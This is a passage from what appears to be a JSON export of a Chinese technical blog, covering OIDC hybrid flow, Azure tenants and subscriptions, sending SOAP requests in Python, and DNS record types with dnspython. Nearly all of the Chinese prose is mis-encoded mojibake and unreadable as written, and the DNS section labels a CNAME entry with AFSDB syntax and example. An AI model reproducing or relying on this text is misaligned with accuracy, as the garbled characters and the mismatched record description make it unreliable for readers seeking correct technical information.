è®¿é—®è®¤è¯æœåŠ¡å™¨çš„ token æ¥å£ã€‚ï¼ˆäº¬ä¸œæœåŠ¡å™¨æºå¸¦æˆæƒç ä¸ QQ æœåŠ¡å™¨äº¤äº’ï¼‰ è®¤è¯æœåŠ¡å™¨è¿”å› access_token å’Œ id_token ç»™ç¬¬ä¸‰æ–¹åº”ç”¨ã€‚ï¼ˆQQ æœåŠ¡å™¨è¿”å› access_token å’Œ id_token ç»™äº¬ä¸œæœåŠ¡å™¨ï¼‰ æ··åˆæ¨¡å¼å¯ä»¥çµæ´»æ»¡è¶³ codeã€id_tokenã€access_token çš„å„ç§å¤„ç†æ–¹å¼ï¼Œå¯ä»¥åœ¨äº«æœ‰éšå¼æ¨¡å¼ä¾¿åˆ©çš„åŒæ—¶ï¼Œåˆ©ç”¨ code è·å– refresh_tokenï¼Œä»è€Œå¯ä»¥åœ¨åç«¯åˆ·æ–°ç”¨æˆ· access_tokenï¼Œä¸å¿…é‡å¤è®©ç”¨æˆ·ç™»å½•ã€‚ æ€»ç»“ OIDC åè®®æ˜¯ OAuth 2.0 åè®®çš„è¶…é›†ï¼Œæ˜¯å¯ä»¥æ›¿ä»£ OAuth 2.0 çš„ä¸‹ä¸€ä»£èº«ä»½è®¤è¯åè®®ï¼Œèƒ½å¤Ÿè§£å†³è®¤è¯ + æˆæƒä¸¤ä¸ªé—®é¢˜ã€‚OIDC çš„æˆæƒæµç¨‹ä¸ OAuth 2.0 å®Œå…¨ä¸€è‡´ï¼Œèƒ½å¤Ÿä¿æŒå‘ä¸‹å…¼å®¹ã€‚ æˆæƒæœåŠ¡å™¨çš„æ„ä¹‰åœ¨äºç®¡ç†ç¬¬ä¸‰æ–¹åº”ç”¨ã€å—ä¿æŠ¤èµ„æºã€èµ„æºæ‰€æœ‰è€…ä¹‹é—´çš„å…³ç³»ï¼Œè®©äº’ç›¸ä¸ä¿¡ä»»çš„åº”ç”¨ä¹‹é—´å®‰å…¨åœ°æš´éœ²æ•°æ®â€”â€”åº”ç”¨ä¹‹é—´çº¦å®šå¥½æŸç§è§„èŒƒï¼ŒæŒ‰ç…§è¿™ç§è§„èŒƒï¼Œå°±èƒ½åœ¨ç”¨æˆ·æˆæƒçš„å‰æä¸‹ï¼Œå®‰å…¨åœ°å°†æ•°æ®æš´éœ²ç»™ç¬¬ä¸‰æ–¹ï¼Œè€Œç¬¬ä¸‰æ–¹ä¹Ÿæ— éœ€è·çŸ¥ç”¨æˆ·çš„è´¦å¯†ä¿¡æ¯ã€‚","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Azure","slug":"æŠ€æœ¯å‘/Azure","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Azure/"}],"tags":[{"name":"OIDC","slug":"OIDC","permalink":"https://www.sizaif.com/tags/OIDC/"},{"name":"OAuth2.0","slug":"OAuth2-0","permalink":"https://www.sizaif.com/tags/OAuth2-0/"}],"author":"sizaif"},{"title":"Azure Tenant,subscriptionçš„å…³ç³»","slug":"Azure-tenant-subscriptionçš„å…³ç³»","date":"2021-12-14T12:46:26.000Z","updated":"2021-12-14T14:01:58.549Z","comments":true,"path":"posts/1bfddf42/","link":"","permalink":"https://www.sizaif.com/posts/1bfddf42/","excerpt":"","text":"[toc] Subscriptions, licenses, accounts, and tenants å¾®è½¯æä¾›äº†ç»„ç»‡ã€è®¢é˜…ã€è®¸å¯è¯å’Œç”¨æˆ·å¸æˆ·çš„å±‚æ¬¡ç»“æ„ï¼Œä»¥ä¾¿åœ¨å…¶äº‘äº§å“ä¸­ä¸€è‡´ä½¿ç”¨èº«ä»½å’Œè´¦å• Organization(tenantsç§Ÿæˆ·) ç§Ÿæˆ·ä¸Azureç›¸å…³ï¼ŒæŒ‡çš„æ˜¯Azure Active Directoryçš„å•ä¸ªå®ä¾‹ï¼Œæˆ–è€…é€šå¸¸è¢«ç§°ä¸ºâ€œAzure ADâ€ã€‚Azure ADæ˜¯Microsoftçš„äº‘å¹³å°çš„å…³é”®éƒ¨åˆ†ï¼Œå› ä¸ºå®ƒæä¾›äº†ä¸€ä¸ªå•ä¸€çš„ä½ç½®æ¥ç®¡ç†ç”¨æˆ·ã€ç»„ä»¥åŠä»–ä»¬æ‰€æŒæœ‰çš„ä¸åœ¨Azure ADä¸­å‘å¸ƒçš„åº”ç”¨ç¨‹åºç›¸å…³çš„æƒé™ã€‚ Azure ADæä¾›çš„ä¸»è¦Microsoftåº”ç”¨ç¨‹åºåŒ…æ‹¬Office 365ã€Dynamics 365å’ŒAzureã€‚ æ¯ä¸ªAzure ADç§Ÿæˆ·éƒ½æ˜¯å…¨çƒå”¯ä¸€çš„ï¼Œé€šå¸¸ä½¿ç”¨ä»¥â€œonmicrosoft.comâ€ç»“å°¾çš„åŸŸï¼ˆå³ myazuread.onmicrosoft.comï¼‰ï¼Œå¹¶ä¸”æ¯ä¸ªç§Ÿæˆ·éƒ½æœ‰ä¸€ä¸ª UUID/GUID å½¢å¼çš„â€œç§Ÿæˆ· IDâ€ã€‚ç‹¬ç«‹äºå…¶ä»–çš„Azure AD ç§Ÿæˆ·ã€‚ ä¸€ä¸ªç§Ÿæˆ·å¯ä»¥å…³è”å¤šä¸ªè®¢é˜…ï¼Œä½†æ˜¯ä¸€ä¸ªè®¢é˜…åªèƒ½ä¸ªä¸€ä¸ªç§Ÿæˆ·ç»‘å®š é€šä¿—ç†è§£ç§Ÿæˆ·ï¼š Azure ADæ˜¯ç”¨æ¥èº«ä»½è®¤è¯ç®¡ç†çš„ã€‚ç»„ç»‡ç”±å¤šä¸ªç”¨æˆ·ç»„æˆï¼Œå¦‚æœä¸€ä¸ªç»„ç»‡é‡Œçš„å¥½å¤šäººéƒ½éœ€è¦æ³¨å†Œç™»å½•ä½¿ç”¨ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œé‚£ä¹ˆç§Ÿæˆ·å°†è¿™ä¸ªç»„ç»‡é‡Œçš„äººå’Œåº”ç”¨ç¨‹åºåœˆåœ¨ä¸€èµ·ï¼Œç§Ÿæˆ·é‡Œé¢æœ‰ç”¨æˆ·çš„AD ä»¥åŠ æ³¨å†Œè¿™ä¸ªåº”ç”¨ç¨‹åºï¼Œé‚£ä¹ˆè¿™ä¸ªç§Ÿæˆ·é‡Œé¢çš„äººå°±å¯ä»¥é€šè¿‡ADç™»å½•è¿›å»è¿™ä¸ªåº”ç”¨ç¨‹åºã€‚ å¤šç§Ÿæˆ·æŠ€æœ¯çš„å¥½å¤„åœ¨äºï¼š 1ï¼‰å¤šä¸ªç§Ÿæˆ·é‡Œé¢æœ‰ç›¸åº”çš„åº”ç”¨ç¨‹åºï¼Œåœ¨å¤šç§Ÿæˆ·æ„æ¶ä¸‹äº«æœ‰ä¸€æ ·çš„è½¯ä»¶ç¯å¢ƒï¼Œè¿™æ ·è½¯ä»¶æ›´æ–°å¯ä»¥ç»Ÿä¸€è¿›è¡Œï¼Œä¹Ÿå¯ä»¥å…±äº«åº•å±‚èµ„æºï¼ˆå¤šç§å…±äº«æ¨¡å¼ï¼‰ã€‚ 2ï¼‰ç§Ÿæˆ·ä¸ç§Ÿæˆ·ä¹‹é—´è¿›è¡Œæ•°æ®éš”ç¦»ã€‚ ä¸€è¨€ä»¥è”½ä¹‹ï¼šå¤šç§Ÿæˆ·çš„å…³é”®å°±æ˜¯åŒä¸€å¥—åº”ç”¨ç¨‹åºä¸‹å®ç°å¤šç”¨æˆ·ç»„ç»‡çš„æ•°æ®éš”ç¦»ã€‚ Subscriptions è®¢é˜…æ˜¯ä¸ Microsoft é’ˆå¯¹ä½¿ç”¨ä¸€ä¸ªæˆ–å¤šä¸ª Microsoft äº‘å¹³å°æˆ–æœåŠ¡ç­¾è®¢çš„åè®®ï¼Œå…¶è´¹ç”¨åŸºäºæ¯ä¸ªç”¨æˆ·è®¸å¯è¯è´¹ç”¨æˆ–äº‘èµ„æºä½¿ç”¨ç´¯è®¡ã€‚ è®¢é˜…æ˜¯ä¸€ä¸ªé€»è¾‘å®¹å™¨ï¼Œå¯ä»¥åœ¨å…¶ä¸­éƒ¨ç½²ä»»æ„æ•°é‡çš„èµ„æº(è™šæ‹Ÿæœºã€Webåº”ç”¨ç¨‹åºã€å­˜å‚¨å¸æˆ·ç­‰)ã€‚å®ƒè¿˜å¯ä»¥ç”¨äºå¯¹è¿™äº›èµ„æºè¿›è¡Œè®¿é—®æ§åˆ¶ï¼Œä¸è¿‡ç›®å‰æ­£ç¡®çš„æ–¹æ³•æ˜¯åˆ©ç”¨åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶(Role Based access control, RBAC)æˆ–ç®¡ç†ç»„ã€‚ ä¸€å¥è¯è¯´è®¢é˜…å°±æ˜¯ç”¨æ¥å…³è”Azureè´¦æˆ·å’ŒAzureèµ„æºæœåŠ¡çš„ä¸œè¥¿ã€‚ ä¸€ä¸ªç§Ÿæˆ·å¯ä»¥å…³è”å¤šä¸ªè®¢é˜…ã€‚æ¯”å¦‚ï¼Œå…¬å¸å¯ä»¥æŠŠè®¢é˜…å‘½åä¸ºè´¢åŠ¡éƒ¨ã€å¸‚åœºéƒ¨ã€é”€å”®éƒ¨ç­‰ç­‰æ¥ç®¡ç†ã€‚æ¯ä¸ªè®¢é˜…çš„è´¹ç”¨å’Œè®¡è´¹æ–¹å¼å’Œä½¿ç”¨éƒ½æ˜¯ç‹¬ç«‹åˆ†å¼€çš„ã€‚ä½†æ˜¯ä¸€ä¸ªè®¢é˜…åªèƒ½ä¸ªä¸€ä¸ªç§Ÿæˆ·ç»‘å®šã€‚ è´¦æˆ·å’Œè®¢é˜…çš„å…³ç³»å¯ä»¥ç†è§£ä¸ºï¼š è´¦æˆ·æ˜¯äººçš„èº«ä»½è¯ï¼Œè®¢é˜…æ˜¯æ‰‹æœºå·ç ï¼Œæ‰‹æœºå·ç éœ€è¦ç”¨èº«ä»½è¯å»æ³¨å†Œç”³è¯·ï¼Œä¸€ä¸ªäººå¯ä»¥æœ‰å¥½å‡ ä¸ªæ‰‹æœºå·ç ï¼Œæ‹¿ä¸€ä¸ªå·¥ä½œç”¨ï¼Œä¸€ä¸ªå®¶äººç”¨ï¼Œä¸¤è€…åˆ†åˆ«å•ç‹¬è®¡è´¹ä¸åŒç”¨é€”ï¼Œè€Œä¸”ä¸€ä¸ªæ‰‹æœºå·åªèƒ½å¯¹åº”ä¸€ä¸ªèº«ä»½è¯å·ã€‚ ç»„ç»‡å¯è®¢é˜…å¤šä¸ª Micrososft äº‘æœåŠ¡ Licenses è®¸å¯è¯å…è®¸ç‰¹å®šç”¨æˆ·å¸æˆ·ä½¿ç”¨äº‘äº§å“çš„æœåŠ¡ã€‚ç®¡ç†å‘˜å°†è®¸å¯è¯åˆ†é…ç»™è®¢é˜…ä¸­çš„å„ä¸ªç”¨æˆ·å¸æˆ· å¯¹äºå›¾ä¸­çš„ç¤ºä¾‹ï¼ŒContoso å…¬å¸è®¢é˜…äº†å…·æœ‰ 100 ä¸ªè®¸å¯è¯çš„ Office 365 E5ï¼Œå…è®¸æœ€å¤š 100 ä¸ªå•ä¸ªç”¨æˆ·å¸æˆ·ä½¿ç”¨ Microsoft 365 E5 çš„åŠŸèƒ½å’ŒæœåŠ¡ã€‚ AD Active Directory æ‰€æœ‰ Microsoft äº‘æœåŠ¡çš„ç”¨æˆ·å¸æˆ·å‡å­˜å‚¨åœ¨ Active Directory (Azure AD) ç§Ÿæˆ·(tenant)ä¸­ï¼Œå…¶ä¸­åŒ…å«ç”¨æˆ·å¸æˆ·å’Œç»„ã€‚Azure AD tenant å¯ä»¥ä½¿ç”¨åŸºäº Windows æœåŠ¡å™¨æœåŠ¡çš„ Azure AD Connectä¸ç°æœ‰çš„Active Directory Domain Services (AD DS)å¸æˆ·åŒæ­¥ã€‚è¿™å«åšç›®å½•åŒæ­¥ã€‚ ç»„ç»‡ä½¿ç”¨åŒä¸€ Azure AD ç§Ÿæˆ·è¿›è¡Œçš„å¤šä¸ªè®¢é˜… æ´»åŠ¨ç›®å½•æ˜¯ä¸€ä¸ªç³»ç»Ÿï¼Œç”¨æ¥å­˜å‚¨ç›®å½•æ•°æ®ï¼Œç®¡ç†ç”¨æˆ·å’Œèµ„æºä¹‹é—´çš„é€šä¿¡ ADæœ‰ Azure AD å’Œæœ¬åœ°çš„ ADåŸŸæœåŠ¡ï¼ˆAD DSï¼‰ â€‹ AD DSæ˜¯æœ¬åœ°Windows serveræœåŠ¡å™¨ä¸Šçš„è§’è‰²ã€‚ â€‹ Azure AD æ˜¯å¤šç”¨æˆ·å…¬å…±ç›®å½•æœåŠ¡ï¼Œè¿™æ„å‘³ç€Azure ADä¸ºäº‘æœåŠ¡å’Œåº”ç”¨ç¨‹åºåˆ›å»ºç§Ÿæˆ·ã€‚ Azure ADæ˜¯äº‘ä¸Šçš„å¤šç§Ÿæˆ·ç›®å½•å’Œæ ‡è¯†ç®¡ç†æœåŠ¡ï¼Œæä¾›æ ¸å¿ƒç›®å½•å’Œèº«ä»½ç®¡ç†åŠŸèƒ½ï¼Œuserå¯ä»¥ä½¿ç”¨å•ä¸€ç™»å½•SSOæ¥è®¿é—®å…¶ä»–äº‘çš„SaaSåº”ç”¨ç¨‹åºï¼Œå¦‚Office365ã€‚æ¯”å¦‚ï¼Œæ¯ä¸ªOffice365ï¼ŒAzureï¼ŒCRM onlineç§Ÿæˆ·å®é™…ä¸Šéƒ½æ˜¯Azure ADçš„ç§Ÿæˆ·ã€‚ç”¨ç§Ÿæˆ·æ¥ä¸ºAzure ADé‡Œé¢çš„appç®¡ç†è®¿é—®æƒé™ã€‚ AADæ˜¯å¤šç§Ÿæˆ·æœåŠ¡ï¼Œæ„å‘³ç€èƒ½å¤ŸåŒæ—¶æ”¯æŒå¤šä¸ªä¸åŒçš„ç»„ç»‡ï¼Œå¯å­˜å‚¨æ¯ä¸ªç»„ç»‡ä¸­ç”¨æˆ·çš„ç›®å½•ä¿¡æ¯ã€‚ AADåä¸€ç›®å½•ä¸ºå•ä½æ¥åŒºåˆ†èŒƒå›´çš„ã€‚æ¯ä¸ªç›®å½•ç›¸å½“äºä¸€ä¸ªæˆ¿é—´ã€‚è¿™äº›æˆ¿é—´åŒåœ¨ä¸€ä¸ªå¤§æ¥¼é‡Œé¢ï¼Œä½†æ˜¯æ¯ä¸ªæˆ¿é—´åˆæ˜¯ç›¸å¯¹ç‹¬ç«‹çš„ä¸€ä¸ªä¸ªä½“ã€‚è¦æƒ³åœ¨AADä¸­æ·»åŠ äººæˆ–è€…æ·»åŠ ç¨‹åºæ—¶é¦–å…ˆéœ€è¦åˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œç›®å½•æ˜¯æœ€åŸºæœ¬çš„å­˜åœ¨ï¼ŒAADä¸­æ‰€æœ‰çš„ä¸œè¥¿éƒ½æ˜¯ä¿å­˜åœ¨ç›®å½•ä¸­ã€‚","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Win","slug":"æŠ€æœ¯å‘/Win","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Win/"}],"tags":[{"name":"Azure","slug":"Azure","permalink":"https://www.sizaif.com/tags/Azure/"},{"name":"Azure AD","slug":"Azure-AD","permalink":"https://www.sizaif.com/tags/Azure-AD/"}],"author":"sizaif"},{"title":"Python å¤„ç†Soap-Postæ–¹æ³•","slug":"python-å¤„ç†soap-postæ–¹æ³•","date":"2021-11-25T04:08:42.000Z","updated":"2021-11-25T04:24:12.958Z","comments":true,"path":"posts/d61d731c/","link":"","permalink":"https://www.sizaif.com/posts/d61d731c/","excerpt":"","text":"å¯¼è¯­ æœ€è¿‘é¡¹ç›®ç”¨åˆ°å¤„ç†soapæ¥å£åè®®ï¼Œä½¿ç”¨postæ–¹æ³•å‘é€æ•°æ® åœ¨è¿™ä¸ªåœ°æ–¹åœç•™è®¸ä¹…ï¼Œæ•…å°†è§£å†³æ–¹æ³•è®°å½•ä¸‹æ¥ soap soap ä¾èµ–äºXMLæ–‡ä»¶ é¦–å…ˆè¦å¤„ç†XMLæ–‡ä»¶ pythonä¸­æœ‰xmltodict,dicttoxmlä¸¤ä¸ªåº“å¯ä»¥ä½¿ç”¨ ä½¿ç”¨æ–¹æ³• ä¸¤ç§è§£å†³æ–¹æ³•ï¼š ä¸€ç§æ˜¯ requestsæ–¹æ³• å¦ä¸€ç§æ˜¯ä½¿ç”¨sudsåº“ ä¸¤ç§æ–¹æ³•å¯å‚è€ƒï¼š Call a SOAP Service with plain old requests Calling a SOAP WebService with Python Suds # Call a SOAP Service with plain old requests import requests url=\"http://wsf.cdyne.com/WeatherWS/Weather.asmx?WSDL\" #headers = &#123;'content-type': 'application/soap+xml'&#125; headers = &#123;'content-type': 'text/xml'&#125; body = \"\"\"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?> &lt;SOAP-ENV:Envelope xmlns:ns0=\"http://ws.cdyne.com/WeatherWS/\" xmlns:ns1=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"> &lt;SOAP-ENV:Header/> &lt;ns1:Body>&lt;ns0:GetWeatherInformation/>&lt;/ns1:Body> &lt;/SOAP-ENV:Envelope>\"\"\" response = requests.post(url,data=body,headers=headers) print response.content ---------------------åä¸½çš„åˆ†å‰²çº¿1---------------------- # Calling a SOAP WebService with Python Suds from suds.client import Client url=\"http://wsf.cdyne.com/WeatherWS/Weather.asmx?WSDL\" client = Client(url) print client ## shows the details of this service result = client.service.GetWeatherInformation() print result ## see: restult.txt below è¿™é‡Œé‡‡ç”¨çš„æ˜¯requestsæ–¹æ³• é‡åˆ°é—®é¢˜ æ„é€ header``body,uri å æ— è®ºæ˜¯ä½¿ç”¨pythonä»£ç è¿˜æ˜¯ä½¿ç”¨postmanå·¥å…· è·å¾—è¿”å›çš„ç»“æœéƒ½æ˜¯äºŒè¿›åˆ¶æµï¼Œè§£æåä¹±ç  å¦‚ä¸‹å›¾ï¼š å°è¯•å„ç§è®¾ç½®ç¼–ç ä¸º'utf-8' ä»è¾“å‡ºä¹±ç ï¼Œ åˆæ­¥åˆ¤æ–­ï¼š å¯¹è¿”å›çš„ç»“æœè§£æç¼–ç çš„é—®é¢˜ æ„é€ çš„bodyä¸ºï¼š body = \"&lt;?xml version=\\\"1.0\\\" encoding=\\\"utf-8\\\"?>\\n&lt;soap:Envelope xmlns:exm=\\\"http://schemas.microsoft.com/exchange/services/2006/messages\\\" xmlns:ext=\\\"http://schemas.microsoft.com/exchange/services/2006/types\\\" xmlns:a=\\\"http://www.w3.org/2005/08/addressing\\\" xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xmlns:xsd=\\\"http://www.w3.org/2001/XMLSchema\\\">\\n&lt;soap:Header>\\n&lt;a:Action soap:mustUnderstand=\\\"1\\\">http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation&lt;/a:Action>\\n&lt;a:To soap:mustUnderstand=\\\"1\\\">https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc&lt;/a:To>\\n&lt;a:ReplyTo>\\n&lt;a:Address>http://www.w3.org/2005/08/addressing/anonymous&lt;/a:Address>\\n&lt;/a:ReplyTo>\\n&lt;/soap:Header>\\n&lt;soap:Body>\\n&lt;GetFederationInformationRequestMessage xmlns=\\\"http://schemas.microsoft.com/exchange/2010/Autodiscover\\\">\\n&lt;Request>\\n&lt;Domain>\" + domain + \"&lt;/Domain>\\n&lt;/Request>\\n&lt;/GetFederationInformationRequestMessage>\\n&lt;/soap:Body>\\n&lt;/soap:Envelope>\" æ„é€ çš„headerä¸º headers = &#123; 'content-type': 'text/xml', 'SOAPAction': 'http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation', 'User-Agent': 'AutodiscoverClient', &#125; è§£å†³æ–¹æ³•ï¼š åˆ¤æ–­ä¸ºè¿”å›ç»“æœè§£ç é€ æˆçš„ å°è¯•åœ¨headerä¸­æ·»åŠ 'Accept-Encoding':'utf-8' å¦‚ä¸‹: headers = &#123; 'content-type': 'text/xml', 'SOAPAction': 'http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation', 'User-Agent': 'AutodiscoverClient', 'Accept-Encoding':'utf-8', &#125; ç»“æœï¼š ä¹±ç é—®é¢˜æˆåŠŸè§£å†³ï¼š","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"python","slug":"æŠ€æœ¯å‘/python","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.sizaif.com/tags/python/"},{"name":"soap","slug":"soap","permalink":"https://www.sizaif.com/tags/soap/"}],"author":"sizaif"},{"title":"pythonè§£æDNSè®°å½•","slug":"pythonè§£æDNSè®°å½•","date":"2021-11-24T16:11:48.000Z","updated":"2021-11-25T04:07:51.905Z","comments":true,"path":"posts/c3784c4e/","link":"","permalink":"https://www.sizaif.com/posts/c3784c4e/","excerpt":"","text":"å¯¼è¯­ æœ€è¿‘é¡¹ç›®ç”¨åˆ° python è§£æDNSè®°å½•ï¼Œæ•…å°†è¿‡ç¨‹è®°å½•ä¸‹æ¥ å¸¸ç”¨è§£æè®°å½• 1.ä¸»æœº[A]è®°å½• æè¿°: ä¸»æœºåœ°å€è®°å½•ã€‚åœ¨ DNS åŸŸåä¸ IP åœ°å€ä¹‹é—´å»ºç«‹æ˜ å°„å…³ç³»è¯­æ³•: owner class ttl A IP_v4_address ä¾‹å­: host1.example.microsoft.com. IN A 127.0.0.1 2.åˆ«å[CNAME] æè¿°: ç”¨æ¥è¡¨ç¤ºç”¨åœ¨è¯¥åŒºåŸŸä¸­çš„å…¶å®ƒèµ„æºè®°å½•ç±»å‹ä¸­å·²æŒ‡å®šåç§°çš„æ›¿è¡¥æˆ–åˆ«å DNS åŸŸåã€‚è¯­æ³•: owner ttl class AFSDB subtype server_host_name ä¾‹å­: aliasname.example.microsoft.com. AFSDB 1 truename.example.microsoft.com. 3.ä¸»æœºä¿¡æ¯[HINFO] æè¿°: ç”¨æ¥è¯´æ˜æ˜ å°„åˆ°ç‰¹å®š DNS ä¸»æœºåçš„ CPU ç±»å‹å’Œæ“ä½œç³»ç»Ÿç±»å‹çš„ RFC-1700 ä¿ç•™å­—ç¬¦ä¸²ç±»å‹ï¼Œè¿™ä¸ªä¿¡æ¯å¯ä»¥è¢«åº”ç”¨ç¨‹åºé€šä¿¡åè®®ä½¿ç”¨ã€‚è¯­æ³•: owner ttl class HINFO cpu_type os_type ä¾‹å­: my-computer-name.example.microsoft.com. HINFO INTEL-386 WIN32 4.é‚®ç®±[MB] æè¿°: ç”¨æ¥å°†æŒ‡å®šçš„åŸŸé‚®ç®±åæ˜ å°„åˆ°è¿™ä¸ªé‚®ç®±çš„ä¸»æœºçš„å½“å‰åŒºåŸŸä¸­çš„ä¸»æœºåœ°å€è®°å½•è¯­æ³•: owner ttl class MB mailbox_hostname ä¾‹å­: mailbox.example.microsoft.com. MB mailhost1.example.microsoft.com 5.é‚®ç®±æˆ–é€šä¿¡ä¿¡æ¯ MINFO æè¿°: ç”¨æ¥æŒ‡å®šè´Ÿè´£ç»´æŠ¤è¯¥è®°å½•ä¸­ç‰¹å®šé€šä¿¡åå•æˆ–é‚®ç®±çš„è”ç³»åŸŸé‚®ç®±åç§°ã€‚åŒæ—¶ï¼Œè¿˜è¢«ç”¨æ¥æŒ‡å®šæ¥æ”¶ä¸è¯¥è®°å½•ä¸­ç‰¹å®šé€šä¿¡åå•æˆ–é‚®ç®±æœ‰å…³çš„é”™è¯¯ä¿¡æ¯çš„é‚®ç®±è¯­æ³•: owner ttl class MINFO responsible_mailbox error_mailbox ä¾‹å­: administrator.example.microsoft.com. MINFO resp-mbox.example.microsoft.com err-mbox.example.microsoft.com 6.é‚®ä»¶äº¤æ¢å™¨ [MX] æè¿°: ç”¨æ¥å‘ç‰¹å®šé‚®ä»¶äº¤æ¢å™¨æä¾›æ¶ˆæ¯è·¯ç”±ï¼Œè¯¥ä¸»æœºä½œä¸ºæŒ‡å®š DNS åŸŸåçš„é‚®ä»¶äº¤æ¢å™¨ã€‚MX è®°å½•éœ€è¦ä¸€ä¸ª16-ä½æ•´æ•°æ¥è¡¨ç¤ºæ¶ˆæ¯è·¯ç”±ä¸­çš„ä¸»æœºä¼˜å…ˆçº§ï¼Œå¤šä¸ªé‚®ä»¶äº¤æ¢åœ¨æ¶ˆæ¯ä¸€ä¸­è¢«æŒ‡å®šã€‚å¯¹äºè¿™ä¸ªè®°å½•ç±»å‹ä¸­çš„æ¯ä¸ªé‚®ä»¶äº¤æ¢ä¸»æœºï¼Œéœ€è¦ä¸€ä¸ªç›¸åº”çš„ä¸»æœºåœ°å€ç±»å‹è®°å½•ã€‚è¯­æ³•: owner ttl class MX preference mail_exchanger_host ä¾‹å­: example.microsoft.com. MX 10 mailserver1.example.microsoft.com 7.æŒ‡é’ˆè®°å½• [PTR] æè¿°:ç”¨æ¥æŒ‡å‘åŸŸåç©ºé—´ä¸­çš„æŸä¸ªä½ç½®ã€‚PTRè®°å½•é€šå¸¸åœ¨ç‰¹æ®ŠåŸŸä¸­æ¥æ‰§è¡Œåœ°å€åˆ°åç§°é•œåƒçš„åå‘æœç´¢ã€‚æ¯ä¸ªè®°å½•æä¾›è¦æŒ‡å‘åŸŸåç§°ç©ºé—´çš„æŸä¸ªå…¶å®ƒä½ç½®çš„ç®€å•æ•°æ®ã€‚ Syntax: owner ttl class PTR targeted_domain_name ä¾‹å­: 1.0.0.10.in-addr.arpa. PTR host.example.microsoft.com. 8.æœåŠ¡è®°å½• [SRV] æè¿°: SRV èµ„æºè®°å½•å…è®¸ç®¡ç†å‘˜ä½¿ç”¨å•ä¸€ DNS åŸŸçš„å¤šä¸ªæœåŠ¡å™¨ï¼Œå®¹æ˜“çš„ç”¨ç®¡ç†åŠŸèƒ½å°† TCP/IP æœåŠ¡ä»ä¸€ä¸ªä¸»æœºç§»åˆ°å¦ä¸€ä¸ªä¸»æœºï¼Œå¹¶ä¸”å°†æœåŠ¡æä¾›çš„ç¨‹åºä¸»æœºåˆ†æ´¾ä¸ºæœåŠ¡çš„ä¸»æœåŠ¡å™¨ï¼Œå°†å…¶å®ƒçš„åˆ†æ´¾ä¸ºè¾…åŠ©çš„è¯­æ³•: service.protocol.name ttl class SRV preference weight port target ä¾‹å­: ldap.tcp.ms-dcs SRV 0 0 389 dc1.example.microsoft.com SRV 10 0 389 dc2.example.microsoft.com 9.å·²çŸ¥æœåŠ¡è®°å½• [WKS] æè¿°: ç”¨æ¥æè¿°ä¸€ä¸ªç‰¹å®š IP åœ°å€ä¸Šç‰¹å®šé€šè®¯åè®®æ”¯æŒçš„ TCP/IP æœåŠ¡ï¼Œå®ƒæä¾› TCP å’Œ UDP å¯ä½¿ç”¨æ€§ä¿¡æ¯ã€‚å¦‚æœæœåŠ¡å™¨åŒæ—¶æ”¯æŒ TCP å’Œ UDP çš„å·²çŸ¥æœåŠ¡ï¼Œæˆ–è€…æœ‰å¤šä¸ªæ”¯æŒæœåŠ¡çš„ IP åœ°å€ï¼Œå¤šä¸ª WKS è®°å½•ä¼šè¢«ä½¿ç”¨è¯­æ³•: owner ttl class WKS address protocol service_list ä¾‹å­: example.microsoft.com. WKS 10.0.0.1 TCP ( telnet smtp ftp ) åœ¨&quot;èµ·å§‹é¢å‘æœºæ„&quot; SOA ä¸­ï¼Œè®°å½•äº†è¿™ä¸ª Zone ä¸­ DNS æœåŠ¡å™¨æ˜¯é‚£ä¸€å°ä¸»æœºï¼Œä¹Ÿè®°å½•ç€è´Ÿè´£æœ¬ zone çš„ç®¡ç†å‘˜çš„é‚®ä»¶åœ°å€ï¼Œå¦‚æœä»¥ååœ¨å®‰è£…é‚®ä»¶æœåŠ¡å™¨éœ€è¦ä¿®æ”¹è¯¥ä¿¡æ¯æ—¶ï¼Œæ³¨æ„å°†é‚®ä»¶åœ°å€ä¸­çš„ â€œ@â€ ç¬¦æ”¹ä¸ºå¥ç‚¹ â€œ.â€ ï¼Œå› ä¸º â€œ@â€ æ˜¯ä¿ç•™å­—ï¼Œä»£è¡¨ zoneï¼›å¦å¤–ï¼Œè¦ä½¿ç”¨åŸŸå®Œæ•´åç§° FQDNï¼Œä¸è¦æ¼æ‰æœ€åçš„å¥ç‚¹ã€‚å¯ä»¥é€šè¿‡ &quot;zoneâ†’å±æ€§â†’èµ·å§‹é¢å‘æœºæ„&quot;å¯¹ç®¡ç†å‘˜é‚®ä»¶åœ°å€è¿›è¡Œä¿®æ”¹ã€‚ dnspythonåº“ å¦‚æœæŸ¥è¯¢ä¸åˆ°å¯¹åº”çš„ç»“æœæŠ¥dns.resolver.NoAnsweré”™è¯¯ï¼š dns.resolver.NoAnswer: The DNS response does not contain an answer to the question: baidu.com. IN XXX å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ï¼š try: re = dns.resolver.query(qname,rdtype) except dns.resolver.NoAnswer: XXXX è§£æ Aè®°å½• ''' 